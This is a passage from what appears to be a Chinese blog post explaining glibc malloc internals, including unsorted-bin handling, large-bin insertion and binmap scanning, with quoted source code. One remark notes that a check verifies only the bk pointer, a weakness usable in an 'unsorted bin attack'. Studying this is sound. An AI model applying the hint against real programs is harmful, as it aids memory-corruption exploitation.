class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset (victim, nb);</span><br><span class="line">    unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">    av-&gt;last_remainder = remainder;</span><br><span class="line">    remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">    &#123;</span><br><span class="line">        remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_head (victim, nb | PREV_INUSE |</span><br><span class="line">    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">    set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有四个条件：</p><ol><li><code>in_smallbin_range (nb)</code>：申请<code>small bin</code>范围内的<code>chunk</code></li><li><code>bck == unsorted_chunks (av)</code>：<code>bck=victim-&gt;bk=unsorted_chunks(av)-&gt;bk-&gt;bk</code>，也就是说<code>unsorted_chunks (av)-&gt;bk-&gt;bk=unsorted_chunks (av)</code>，翻译一下差不多就是<code>unsorted bin中</code>只有一个<code>chunk</code>。</li><li><code>victim == av-&gt;last_remainder</code>：就是说这个chunk刚好是最近被分割过的剩余部分。</li><li><code>(unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE))</code>：保证我找到的这个<code>chunksize</code> &gt; 需要的最小块+<code>MINSIZE</code>。为了保证等会我切割出<code>nb size</code>之后剩余的<code>chunk</code>能&gt;<code>MINSIZE</code>，这里我也不知道为什么不能等于，可能解读哪里有误吧，如果您知道请帮我勘误一下，谢谢了。</li></ol><p>然后接下来就是切割<code>victim</code>，切割出一块刚刚好大小的<code>chunk</code>给用户，切割出来的<code>chunk</code>作为新的<code>av-&gt;last_remainder</code>，注意如果切割剩余的<code>chunk size</code>不符合<code>small bin</code>的大小，则<code>fd_nextsize</code>和<code>bk_nextisze</code>会被清空，因为剩余的的<code>chunk</code>会被放到<code>unsorted bin</code>当中。</p><p>然后设置<code>victim</code>的<code>size</code>为<code>nb|PREV_INUSE</code>，然后判断是否为主分配加上标记。</p><p>然后把remainder的<code>prev_inuse</code>位设置为1，因为前一个块已经被拿走使用了，所以这个<code>prev_inuse</code>要设置为1。</p><p>然后因为<code>remainder</code>的<code>size</code>发生了改表，所以下一个<code>chunk</code>的<code>prev_size</code>也要相应地改变。</p><p>剩下的前面类似的都讲过就不赘述了。</p><h4 id="第三小块"><a href="#第三小块" class="headerlink" title="第三小块"></a>第三小块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size == nb)</span><br><span class="line">&#123;</span><br><span class="line">    set_inuse_bit_at_offset (victim, size);</span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">        victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">&#123;</span><br><span class="line">    victim_index = smallbin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>否则会先取出这最后一个<code>chunk</code>，把它移除<code>unsorted bin</code>。如果取出的这个<code>size</code>刚好等于这个<code>nb</code>，那就说明这个块一定是最合适的，直接把它返回了，不要迟疑。如果并不是最合适呢，那么先会判断一下它是否属于<code>small bin</code>，属于则执行以下的逻辑，把<code>bck</code>对应<code>bin</code>的<code>bk</code>，<code>fwd</code>为对应<code>bin</code>的<code>fd</code>，也就是找到那一对<code>bin</code>，<code>fwd</code>在前，<code>bck</code>在后。就没了，预计等会就要用这些指针把<code>chunk</code>链进去了。</p><h4 id="第四小块"><a href="#第四小块" class="headerlink" title="第四小块"></a>第四小块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    victim_index = largebin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">    <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">        size |= PREV_INUSE;</span><br><span class="line">        <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">        assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">        &#123;</span><br><span class="line">            fwd = bck;</span><br><span class="line">            bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">            victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">            fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">            &#123;</span><br><span class="line">                fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;size)</span><br><span class="line">                <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                fwd = fwd-&gt;fd;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line">            bck = fwd-&gt;bk;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果不是<code>small bin</code>，那就得进<code>large bin</code>了，要进<code>large bin</code>。这里要知道，<code>large bin</code>可是所有<code>bin</code>当中最复杂的<code>bin</code>了，一个<code>chunk</code>四个指针，一对<code>bin</code>管理一个二维双向链表，<code>fd</code>,<code>bk</code>指针与相同大小的<code>chunk</code>连接，<code>fd_nextsize</code>和<code>bk_nextsize</code>与不同大小的<code>chunk</code>连接。</p><p>然后呢，虽然<code>fd</code>和<code>bk</code>是连接相同大小的<code>chunk</code>，但是那一对bin还是相当于是<code>fd</code>和<code>bk</code>字段。除了表头以外，其余的不同大小的chunk都是靠<code>fd_nextsize</code>和<code>bk_nextsize</code>的。并且沿着<code>bk_nextsize</code>，<code>chunksize</code>递增。也就是说<code>av-&gt;bin[index]-&gt;bk</code>是第一个<code>chunk</code>，并且<code>size</code> 最小，然后通过<code>bk_nextsize</code>字段一直连接到<code>av-&gt;bin[index]-&gt;fd</code>，反向同理。还有一点需要注意：<code>large bin</code>所在的<code>chunk</code>并不与<code>chunk</code>双向连接。</p><p>这里给出一张<code>large bin</code>的结构图，看看能不能帮助理解一下</p><p><img src="/2022/01/27/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/2.png" alt="2"></p><p>那么这里的<code>bck</code>指的是<code>bin</code>所在的<code>chunk</code>，<code>fwd</code>指的是最大的这个<code>chunk</code>。</p><p><code>bck-&gt;bk</code>指的就是图上的n号<code>chunk</code>，也是这个<code>large bin</code>中最小的那个<code>chunk</code>，如果拿出来的<code>unsorted bin</code>它比最小的<code>chunk</code>还要小，那就已经可以确定插入在哪了，就不用做下面的循环再看看它在哪了。然后就是一个链表的插入操作，这里要注意的是，<code>bin</code>所在的<code>chunk</code>只有<code>fd</code>和bk指针，而其它<code>chunk</code>都是<code>fd_nextsize</code>和<code>bk_nextsize</code>连接的。我们只需要先在最大块和最小块之间插入，然后把<code>bin-&gt;bk</code>指向<code>victim</code>即可。</p><p>那么我们大概自己写一下操作看看与源码是否一致。首先不考虑bin，只考虑链表的情况下，我们先找到最大块和最小块。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fwd=bin-&gt;fd;</span><br><span class="line">bck=bin-&gt;bk;</span><br><span class="line">victim-&gt;bk_nextsize=bck;</span><br><span class="line">victim-&gt;fd_nextsize=fwd;</span><br><span class="line">fwd-&gt;bk_nextsize=bck-&gt;fd_nextsize=victim;</span><br></pre></td></tr></table></figure><p>跟上面大致一样，只不过它这里<code>fwd</code>的值是那个<code>large bin</code>的<code>chunk</code>，直接通过<code>fd</code>指针也能直接找到最大的<code>chunk</code>。所以我后面的主要代码应该把<code>fwd</code>改成<code>fwd-&gt;fd</code>就跟上面一模一样了。</p><p>如果不是，那就接着往<code>bk_nextsize</code>这个指针上面找，找到大于等于的<code>chunk</code>为止。然后如果等于，就只需要用<code>fd</code>和<code>bk</code>指针与相等大小的<code>chunk</code>相连，如果没有相等，就得在<code>fd_nextsize</code>和<code>bk_nextsize</code>方向上插入，然后<code>fd</code>和<code>bk</code>都默认指向自己。这个我就不演试了，跟前面那个基本是一样的。</p><h4 id="第五小块"><a href="#第五小块" class="headerlink" title="第五小块"></a>第五小块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line"><span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>这个就很简单了，就是一个插入操作，前面既然已经找到了插入的位置，这里一气呵成直接解决了。然后这里还有一个遍历<code>unsorted bin</code>的最大值，一次最多遍历<code>10000</code>个<code>unsorted bin</code>，这个也可以理解，如果我一次产生了很多的<code>unsorted bin</code>，然后我一次<code>malloc</code>，那边一直在循环搞这个<code>unsorted bin</code>，迟迟就没分配内存回来所以这里设定一个最大值。</p><p>到了这里，对<code>unsorted bin</code>的遍历就结束了。</p><h4 id="第六小块"><a href="#第六小块" class="headerlink" title="第六小块"></a>第六小块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">&#123;</span><br><span class="line">    bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">    <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;</span><br><span class="line">        (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (victim-&gt;size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))</span><br><span class="line">    &#123;</span><br><span class="line">        victim = victim-&gt;bk_nextsize;</span><br><span class="line">        <span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb)))</span><br><span class="line">            victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                 list does not have to be rerouted.  */</span></span><br><span class="line">        <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">            victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line">        unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Exhaust */</span></span><br><span class="line">        <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">        &#123;</span><br><span class="line">            set_inuse_bit_at_offset (victim, size);</span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* Split */</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            remainder = chunk_at_offset (victim, nb);</span><br><span class="line">            <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">            bck = unsorted_chunks (av);</span><br><span class="line">            fwd = bck-&gt;fd;</span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">            &#123;</span><br><span class="line">                errstr = <span class="string">&quot;malloc(): cor</span></span><br><span class="line"><span class="string">                    rupted unsorted chunks&quot;</span>;</span><br><span class="line">                <span class="keyword">goto</span> errout;</span><br><span class="line">            &#125;</span><br><span class="line">            remainder-&gt;bk = bck;</span><br><span class="line">            remainder-&gt;fd = fwd;</span><br><span class="line">            bck-&gt;fd = remainder;</span><br><span class="line">            fwd-&gt;bk = remainder;</span><br><span class="line">            <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">            &#123;</span><br><span class="line">                remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                      (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">            set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">            set_foot (remainder, remainder_size);</span><br><span class="line">        &#125;</span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这边就看这个最小能满足的<code>nb</code>是否在<code>small bin</code>的范围内。不在则执行，其实如果在的话，那前面有一个<code>small bin</code>的范围判断，如果<code>small bin</code>范围那，<code>idx</code>就是<code>small bin</code>，不在则是<code>large bin</code>的<code>idx</code>。<code>small bin</code>之前已经判断过一遍了，并且判断策略也跟之前不一样，所以这里加一个<code>!in_small_bin_range</code>的判断还是很有必要的。</p><p>来看下面的if语句，两个条件。</p><ol><li><code>(victim = first (bin)) != bin</code>：这个bin里面有<code>chunk</code>，并使<code>victim=bin-&gt;fd</code></li><li><code>(unsigned long) (victim-&gt;size) &gt;= (unsigned long) (nb)</code>：找到目标chunk的size要大于等于这个最小能满足的size  nb。</li></ol><p>同时满足那么就可能要取这一块chunk来分配了，正如注释所说，如果bin为空或者最大的chunk还是比较小，那就跳过这个逻辑。然后<code>victim = victim-&gt;bk_nextsize</code>，这里<code>victim</code>是最大块，最大块的<code>bk_nextsize</code>就是最小块，这里应该也是尽量寻找最小能满足的块。正如循环所描述，如果<code>victim</code>的<code>chunk size</code>比我所需的最小能满足的<code>chunk size</code> <code>nb</code>还小，那就去寻找比他大的，因为是递增，所以能保证在<code>chunk</code>当中我一定会找到一个最小能满足的<code>chunk</code>。</p><p>这里解释一下两个最小能满足的意思：</p><p>首先<code>nb</code>是指用户需要的最小能满足的块的<code>size</code>，比如我只需要1个字节，但是我最小的<code>chunk size</code>都是<code>0x20</code>了，<code>0x20</code>的<code>chunk</code>就是对用户最小能满足的<code>chunk size</code>了。</p><p>如果能找到<code>size=nb</code>的块，当然是最好不过了，但是现实往往不会那么顺利，比如我只有一个<code>0x30</code>的块，如果我只有<code>0x30</code>而没有<code>0x20</code>的块，那么<code>0x30</code>就是我所有<code>free</code>块当中的最小能满足，其实这里<code>nb</code>应该叫最优能满足，但是我还是习惯这么叫了hhh。</p><p>然后呢找到这个之后就<code>unlink</code>这个块，把它从链中删除，拿出来之后进行一个判断，如果切割之后的块小于MINSIZE，那就不切割了，直接把它物理相邻的下一个快<code>prev_inuse</code>位设1，这个块就直接返回给用户了。否则就是切割，设置各种东西，这个前面有差不多的代码，我们主要看看剩下的块去哪里了，很明显，重新链入<code>unsorted bin</code>了。后面有一个<code>check</code>，如果<code>unsorted bin-&gt;fd-&gt;bk!=unsorted bin</code>，那么报错退出。这里需要注意，它只检测了<code>unsorted bin-&gt;fd-&gt;bk</code>是否等于那个<code>unsorted bin</code>，对于堆块来说我就是只检测了<code>bk</code>指针，这意味着<code>fd</code>指针如果修改为任意值不会在这里被检测到，这是一个利用小技巧，也只有你读过源码后才能好好理解这个<code>unsorted bin attack</code>了。然后如果剩余大小不在<code>small bin</code>范围内把<code>nextsize</code>指针全部清空，其它就是正常返回了。如果被切割的剩下<code>chunk</code>不在<code>small bin</code>范围内，就会清空它的<code>fd_nextsize</code>和<code>bk_nextsize</code>。因为它要回到<code>unsorted bin</code>里面，这两个字段就没什么用了，就会被清空。</p><h4 id="第七小块"><a href="#第七小块" class="headerlink" title="第七小块"></a>第七小块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">++idx;</span><br><span class="line">bin = bin_at (av, idx);</span><br><span class="line">block = idx2block (idx);</span><br><span class="line"><span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">bit = idx2bit (idx);</span><br></pre></td></tr></table></figure><p>我们来讲一讲<code>arena</code>的<code>binmap</code>结构，这个用于快速检索一个<code>bin</code>是否为空，每一个<code>bit</code>表示对应的<code>bin</code>中是否存在空闲<code>chunk</code>，虽然不知道为什么前面没有用到。这一段就是说，如果<code>large bin</code>搜索完了都没有找到合适的<code>chunk</code>，那么就去下一个<code>idx</code>里面寻找，这很合理。然后一共有4个int，每个<code>int</code>32位表示一块<code>map</code>，一共表示<code>128</code>位。</p><h4 id="第八小块"><a href="#第八小块" class="headerlink" title="第八小块"></a>第八小块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(;;)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">    <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">                <span class="keyword">goto</span> use_top;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">        bit = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ........</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们来看看两个条件</p><ol><li><code>bit&gt;map</code>：如果这个位的权值都比它整个的<code>map</code>都大了，说明<code>map</code>上那个<code>bit</code>的权值必定为0</li><li><code>bit==0</code>：如果这个<code>bit</code>都是0说明这个<code>index</code>也不对。</li></ol><p>满足其一就看看别的<code>index</code>。</p><p>然后如果说<code>map==0</code>，说明这整个<code>block</code>都没有空闲块，就直接跳过，不为0则退出去执行下面的操作，如果超过了<code>block</code>的总数，那就说明<code>unsorted bin</code>和<code>large bin</code>中也没有合适的<code>chunk</code>，那我们就切割<code>top_chunk</code>了，这里用了一个<code>goto</code>跳转，我们后面分析。</p><h4 id="第九小块"><a href="#第九小块" class="headerlink" title="第九小块"></a>第九小块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line"><span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    bin = next_bin (bin);</span><br><span class="line">    bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">    assert (bit != <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">victim = last (bin);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line"><span class="keyword">if</span> (victim == bin)</span><br><span class="line">&#123;</span><br><span class="line">    av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">    bin = next_bin (bin);</span><br><span class="line">    bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此时我已经找到了一个合适的<code>block</code>，然后就是看<code>block</code>的各个位了。从低位开始，如果检查到<code>map</code>那一位对应为0就找下一位，我们前面提到bk为<code>large bin</code>的最小块，所以先考虑它，当然不能说<code>map</code>里面说这里有它就有，我还得自己判断一下这个<code>bin</code>里面是不是真的有，如果没有(<code>bin-&gt;bk==bin</code>)，那么我就要及时把标志位清除然后<code>bit&lt;&lt;1</code>去寻找下一个<code>index</code>。</p><h4 id="最后一小块"><a href="#最后一小块" class="headerlink" title="最后一小块"></a>最后一小块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    size = chunksize 